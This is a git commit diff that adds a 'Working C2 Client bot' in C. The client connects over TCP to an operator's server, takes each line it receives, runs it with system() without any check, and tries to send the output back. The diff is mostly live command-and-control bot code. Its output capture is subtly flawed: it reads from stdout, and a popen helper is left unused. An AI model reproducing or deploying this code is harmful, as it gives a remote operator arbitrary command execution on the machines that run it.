6044c5930613a8b36b82398eed87f1a638691a75
tlee10333 <trinityl10333@gmail.com>
2024-05-02 02:00:55 -0400

    Working C2 Client bot

--- auto_code/auto_client.c
+++ auto_code/auto_client.c
@@ -17,16 +17,75 @@ void try_connect(int client_socket, struct sockaddr_in server_addr) {
   // Try connecting
   if (connect(client_socket, (struct sockaddr *)&server_addr,
               sizeof(server_addr)) < 0) {
-    error_and_exit("connection failed");
+    error_and_exit("Connection failed\n");
   }
 }
 
 FILE *get_socket_file(int client_socket) {
-  FILE *socket_file = fdopen(client_socket, "w+");
+  FILE *socket_file = fdopen(client_socket, "r+");
   if (socket_file == NULL) {
-    error_and_exit("Couldn't open socket as file stream");
+    error_and_exit("Couldn't open socket as file stream\n");
   }
   return socket_file;
+}
+
+char *getSystemCommandOutput(const char *command) {
+  int MAX_BUFFER_SIZE = 100;
+  char buffer[MAX_BUFFER_SIZE];
+  char *result = NULL;
+  FILE *pipe = popen(command, "r");
+
+  if (!pipe) {
+    printf("Error: Failed to execute command.\n");
+    return NULL;
+  }
+
+  while (fgets(buffer, MAX_BUFFER_SIZE, pipe) != NULL) {
+    // Append the output to the result string
+    if (result == NULL) {
+      result = strdup(buffer);
+    } else {
+      char *temp = realloc(result, strlen(result) + strlen(buffer) + 1);
+      if (temp == NULL) {
+        printf("Error: Memory allocation failed.\n");
+        free(result);
+        pclose(pipe);
+        return NULL;
+      }
+      result = temp;
+      strcat(result, buffer);
+    }
+  }
+
+  pclose(pipe);
+  return result;
+}
+int command_recv(FILE *socket_file) {
+  char *recv_line = NULL;
+  size_t recv_line_size = 0;
+  // Wait to receive a message from the server
+  if (getline(&recv_line, &recv_line_size, socket_file) == -1) {
+    printf("Error in receiving message\n");
+    return -1;
+  }
+
+  // Read the output of the command and send it back to the server
+  char output_buffer[4096]; // Adjust buffer size as needed
+
+  system(recv_line);
+
+  while (fgets(output_buffer, sizeof(output_buffer), stdout) != NULL) {
+    printf("%s\n", output_buffer);
+    if (fputs(output_buffer, socket_file) == EOF) {
+      printf("Error sending response to server\n");
+      free(recv_line);
+      return -1;
+    }
+  }
+
+  free(recv_line);
+
+  return 0;
 }
 
 int main(int argc, char *argv[]) {
@@ -55,61 +114,32 @@ int main(int argc, char *argv[]) {
   fflush(stdout);
 
   /* Create a socket for the client */
-  printf("Open socket");
   sockfd = open_tcp_socket();
-
   /* Name the socket, as agreed with the server */
-
   hostinfo = gethostbyname(hostname); /* look for host's name */
-
-  //Make a sockaddr_in for binding/connecting
+  // Make a sockaddr_in for binding/connecting
   struct sockaddr_in address = {
       .sin_family = AF_INET,
       .sin_port = (in_port_t)htons(port),
       .sin_addr = *(struct in_addr *)*hostinfo->h_addr_list,
   };
-  
-  printf("\nBefore connect");
+
   /* Connect the socket to the server's socket */
   try_connect(sockfd, address);
+  FILE *socket_file = get_socket_file(sockfd);
+  int socket_file_status = 0;
+  while (socket_file_status != -1) {
+    socket_file_status = command_recv(socket_file);
 
-  fflush(stdout);
-  FD_ZERO(&clientfds);
-  FD_SET(sockfd, &clientfds);
-  FD_SET(0, &clientfds);
-
-  /*  Now wait for messages from the server */
-  printf("\nbefore while");
-  while (1) {
-    testfds = clientfds;
-    select(FD_SETSIZE, &testfds, NULL, NULL, NULL);
-    for (fd = 0; fd < FD_SETSIZE; fd++) {
-      if (FD_ISSET(fd, &testfds)) {
-        if (fd == sockfd) {
-          result = read(sockfd, msg, MSG_SIZE); /*read data from open socket*/
-          msg[result] = '\0';                   /* Terminate string with null */
-          // printf("\nMsg: %s", msg+1);
-          printf("\nMsg: %s", msg);
-          if (msg[0] == 'X') {
-            close(sockfd);
-            exit(0);
-          }
-          system(msg); /* Calling system commands */
-          printf("\n%s", msg);
-
-        } else if (fd == 0) { /*process keyboard activiy*/
-          fgets(kb_msg, MSG_SIZE + 1, stdin);
-          if (strcmp(kb_msg, "quit\n") == 0) {
-            sprintf(msg, "\nXis shutting down.\n");
-            write(sockfd, msg, strlen(msg));
-            close(sockfd); /*close the socket*/
-            exit(0);       /*end program*/
-          } else {
-            sprintf(msg, "M%s", kb_msg);
-            write(sockfd, msg, strlen(msg));
-          }
-        }
-      }
-    }
+    // socket_file_status = command_recv(socket_file);
   }
+
+  if (!feof(stdin) && !feof(socket_file)) {
+    error_and_exit("Error reading or writing line:");
+  }
+
+  // Clean up and exit.
+  printf("Closing TCP");
+  close_tcp_socket(sockfd);
+  return 0;
 }
